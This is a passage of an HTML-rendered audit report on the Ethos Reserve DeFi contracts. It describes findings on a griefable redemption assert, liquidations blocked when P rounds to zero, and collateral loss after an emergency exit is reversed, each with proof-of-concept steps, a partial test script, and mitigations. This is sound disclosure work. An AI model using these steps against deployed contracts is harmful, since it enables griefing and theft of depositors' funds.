class=\"mtk1\">.</span><span class=\"mtk12\">collMCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfigCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralMCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireTCRoverMCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collMCR</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireAmountGreaterThanZero</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_LUSDamount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireLUSDBalanceCoversRedemption</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lusdToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_redeemer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_LUSDamount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalLUSDSupplyAtStart</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getEntireSystemDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Confirm redeemer&#39;s balance is less than total LUSD supply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lusdToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_redeemer</span><span class=\"mtk1\">) &lt;= </span><span class=\"mtk12\">totals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalLUSDSupplyAtStart</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This makes sense in a single collateral system such as Liquity, but is problematic in a multi-collateral one like Reserve. Since each collateral type tracks its own debt but mints the same LUSD token, LUSD supply (and thus balance) being less than the collateral debt is no longer an invariant. This can can result in:</p>\n<ul>\n<li>Last trove may be prevented from redeeming by griefers.</li>\n<li>Users that deposit into multiple Trove types may be prevented from redeeming.</li>\n</ul>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Last trove may be prevented from redeeming</strong></p>\n<p>Consider the cases when</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">- There are 2 Trove types (wBTC and wETH). </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">- There is 10000 total LUSD debt in the wBTC Troves.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">- Stability Pool has 150 LUSD deposited i.e. full liquidity to offset debt.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">- There is 100 total LUSD debt in the wETH pool.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">- ETH prices crash and all Troves get liquidated except the last one.</span></span></code></pre>\n<p>A griefer can front-run the last Trove from redeeming by sending the user weth with the amount <code>entireSystemDebt</code> + 1.</p>\n<p>In a similar case as above, any users that may borrow from multiple Troves types such that their LUSD balance is greater than the total collateral debt will be prevented from redeeming. However, this is not as problematic because they can just send their excess tokens out.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider removing this check as the invariant no longer applies.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/549#issuecomment-1469036786\">tess3rac7 (Ethos Reserve) confirmed via duplicate issue <code>#549</code></a></strong></p>\n<hr>\n<h2 id=\"m-10-p-can-be-updated-to-zero-which-can-cause-a-dos-when-liquidating-troves\" style=\"position:relative;\"><a href=\"#m-10-p-can-be-updated-to-zero-which-can-cause-a-dos-when-liquidating-troves\" aria-label=\"m 10 p can be updated to zero which can cause a dos when liquidating troves permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/338\">[M-10] P can be updated to zero which can cause a DOS when liquidating troves</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/338\">koxuan</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/444\">fs0c</a></em></p>\n<p>P is asserted to never be zero in <code>_updateRewardSumAndProduct</code> which is called for every liquidation. However, there is an edge case that can cause P to be zero, causing DOS to certain liquidations.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In <code>_updateRewardSumAndProduct</code> notice <code>assert(newP > 0);</code>. However, the <code>SCALE_FACTOR</code> check is insufficient in ensuring P is always more than zero. Three cycles of very small P can cause P to drop to zero and hence causing revert for that particular liquidation of troves. POC steps are as follows,</p>\n<ol>\n<li>First liquidation newProductFactor is 1e2, <code>1e18*1e2/1e18 = 1e2</code>, since its less than scale factor. 1e9 is multiplied before dividing with 1e18. P = 1e11 after 1st liquidation cycle.</li>\n<li>Second liquidation newProductFactor is 1e3, <code>1e11*1e3/1e18 = 0</code>, since its less than scale factor. 1e9 is multipled. P = 1e5</li>\n<li>Third liquidation newProductFactor is 1e3, <code>1e5*1e3/1e8 = 0</code>, since its less than scale factor, 1e9 is multipled. However, even after 1e9 is multiplied it will result in 1e17, which is less than DECIMAL_PRECISION of 1e18. P = 0.</li>\n<li>Revert due to <code>assert(newP > 0);</code>.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// If the Stability Pool was emptied, increment the epoch, and reset the scale and product P</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newProductFactor</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentEpochCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">EpochUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">currentScale</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ScaleUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentScale</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">newP</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">DECIMAL_PRECISION</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// If multiplying P by a non-zero product factor would reduce P below the scale boundary, increment the scale</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newProductFactor</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DECIMAL_PRECISION</span><span class=\"mtk1\">) &lt; </span><span class=\"mtk12\">SCALE_FACTOR</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">newP</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newProductFactor</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">SCALE_FACTOR</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DECIMAL_PRECISION</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">currentScale</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentScaleCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ScaleUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentScale</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">newP</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentP</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newProductFactor</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DECIMAL_PRECISION</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newP</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">P</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newP</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">P_Updated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newP</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Reasons for putting high is because</p>\n<ol>\n<li>It breaks the invariant of P being > 0 which according to the docs would break deposit tracking when Pool is not empty.</li>\n<li>Even though in some lucky cases, smaller liquidation can be made if batch liquidation is done, in the event that P is at a precarious place whereby all permutations of liquidations done will result in P being 0, liquidation will be DOSed which can be detrimental to protocol as they cannot liquidate bad debt and hence might lead it to insolvency.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Recommend setting <code>SCALE_FACTOR</code> to 1e18, even though the docs did explain that 1e9 is used instead of 1e18 to ensure negligible precision loss, the alternative option is redesigning the mitigation mechanism of rounding error for P.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/444#issuecomment-1469170510\">tess3rac7 (Ethos Reserve) commented via duplicate issue <code>#444</code></a>:</strong></p>\n<blockquote>\n<p>Since this is a disclosed issue in the Liquity repo as of 2 weeks before the time of this comment, and we have made no changes to this piece of code that makes it different from the liquity liquidation logic, I’m not sure if this is a valid bug report made as part of the C4A content, or if it’s just relaying of information that has been public knowledge since before the contest began. Requesting judge to weigh in.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/444#issuecomment-1476081193\">Trust (judge) commented via duplicate issue <code>#444</code></a>:</strong></p>\n<blockquote>\n<p>The affected code is in scope, therefore imo the issue is valid unless communicated otherwise.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-updatestrategyallocbps-can-cause-loss-of-activepools-collateral-during-an-emergency-exit\" style=\"position:relative;\"><a href=\"#m-11-updatestrategyallocbps-can-cause-loss-of-activepools-collateral-during-an-emergency-exit\" aria-label=\"m 11 updatestrategyallocbps can cause loss of activepools collateral during an emergency exit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/255\">[M-11] <code>updateStrategyAllocBPS()</code> can cause loss of ActivePool’s collateral during an emergency exit</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/255\">peakbolt</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/716\">0xsomeone</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/367\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/332\">codeislight</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/318\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/290\">trustindistrust</a>, and <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/262\">0xTheC0der</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L191-L199\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L191-L199</a><br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L123\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L123</a></p>\n<p>The function <code>updateStrategyAllocBPS()</code> can cause ActivePool to record an incorrect profit after <code>setEmergencyExit()</code> is triggered.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The incorrect profit will cause a large portion of the ActivePool’s collateral to be distributed to Treasury, Staking Pool and Stability Pool. Depositors and Stakers can then withdraw the profits, leading to loss of ActivePool’s collateral.</p>\n<h3 id=\"background\" style=\"position:relative;\"><a href=\"#background\" aria-label=\"background permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Background</h3>\n<p>In Ethos Reserve, the Vault rehypothecates the collateral from ActivePool using one or more Strategy, which will deposit the funds in other protocols (e.g. lending pool) to farm for yields.</p>\n<p>Only Guardian and above roles are able to trigger <code>setEmergencyExit()</code> on a specific Strategy to force it to exit all its position upon the next harvest, depositing all funds from lending pool into the Vault. How it works, is that <code>setEmergencyExit()</code> will trigger Vault to <code>revokeStrategy()</code>, setting the strategy’s <code>allocBPS</code> to <code>0</code>. This sets Strategy allocation to <code>0</code> and increases Strategy’s debt, so that it will repay Vault all the funds.<br>\n(see <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L156-L160\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L156-L160</a>)</p>\n<p>Note that <code>setEmergencyExit()</code> is not reversible. I believe this is to protects funds from being re-deployed into the lending pool during an emergency situation (e.g. lending pool hacked or market crash). And it is different from Vault’s EmergencyShutdown, which is effected on all Strategies and is reversible.</p>\n<h3 id=\"detailed-explanation\" style=\"position:relative;\"><a href=\"#detailed-explanation\" aria-label=\"detailed explanation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Detailed Explanation</h3>\n<p>The issue is that, Strategist (a lower privilege role than Guardian) is able to reverse <code>revokeStrategy()</code> by calling <code>updateStrategyAllocBPS()</code> with a non-zero value to increase the strategy allocation. This will lead to a reduction of the strategy’s debt and cause an incorrect profit to be recorded when it liquidate its positions in the next harvest. Due to the incorrect profit, a fee will be charged on it and transferred to Treasury, leaving less funds for the Vault.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L191-L199\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L191-L199</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L123\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L123</a></p>\n<p>Even worse, <code>updateStrategyAllocBPS()</code> will cause an increase to vault’s totalAllocated value during <code>harvest()</code>, while the incorrect profit is transferred to the Vault during harvest. Both of these changes will lead to a discrepancy in the vault’s <code>totalAllocated</code> and its token balance, causing the vault’s total balance to be incorrect and higher than actual. This leads to a higher share price.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L521\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L521</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L528\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultV2.sol#L528</a></p>\n<p>With a higher share price, ActivePool’s owned asset value in the Vault will be inflated. This will cause ActivePool to record an incorrect profit in the next  <code>_rebalance()</code>,  and distrbute them to Treasury, Staking Pool and Stability Pool.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L239-L309\">https://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L239-L309</a></p>\n<p>Depositors and Stakers can then withdraw the profits, leading to loss of ActivePool’s collateral.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Add the following test case to <code>Ethos-Vault/test/start-test.js</code>. This shows that ActivePool’s asset value will be inflated due to the issue. The next test case will show that inflated asset value will cause ActivePool’s <code>_rebalance()</code> to record a profit and distribute them to the respective pools, that can be withdrawn.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">it.only(&#39;updateStrategyAllocBPS can cause loss of ActivePool collateral during emergency exit&#39;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const {vault, strategy, want, wantHolder, strategyAddress, strategist, guardian} = </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await loadFixture(deployVaultAndStrategyAndGetSigners);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // intialize guardian account with ETH for gas</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  const tx = await strategist.sendTransaction({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    to: guardianAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    value: ethers.utils.parseEther(&#39;0.1&#39;),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  await tx.wait();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span 